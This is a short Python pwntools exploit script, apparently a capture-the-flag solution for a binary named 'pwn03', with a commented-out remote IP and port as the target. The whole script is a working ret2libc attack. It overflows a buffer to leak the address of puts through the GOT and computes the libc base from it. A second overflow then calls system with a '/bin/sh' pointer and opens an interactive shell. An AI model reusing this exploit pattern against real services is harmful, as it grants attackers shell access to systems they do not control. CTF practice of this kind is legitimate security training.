from pwn import *

# s = remote(host = "35.247.171.91", port=37339)
s = process("./pwn03")
raw_input("hello pwn03")
gets_add = 0xffffd5eb
ret_add = 0xffffd5fc
offset = ret_add - gets_add

main_add = 0x8048608
put_plt = 0x80483f0
put_got = 0x804a018
system_add = 0xf7e41da0
binadd = 0xf7f62a0b
base = 0xf7e07000
sys_offset = system_add - base
bin_offset = binadd - base
put_offset = 0xf7e66ca0 - base
buffer = 'a' * offset 
buffer += p32(put_plt)
buffer +=  p32(main_add)
buffer += p32(put_got)

s.sendline(buffer)
s.recvuntil('Goodbye!\n')

put_add = u32(s.recv(4))
print "0x%x" % (put_add)
base = put_add - put_offset
sys_add  =sys_offset + base
bin_add = bin_offset + base
buffer2 = 'a'*0x9 + p32(sys_add) + p32(main_add) + p32(bin_add)
s.sendline(buffer2)
s.interactive()
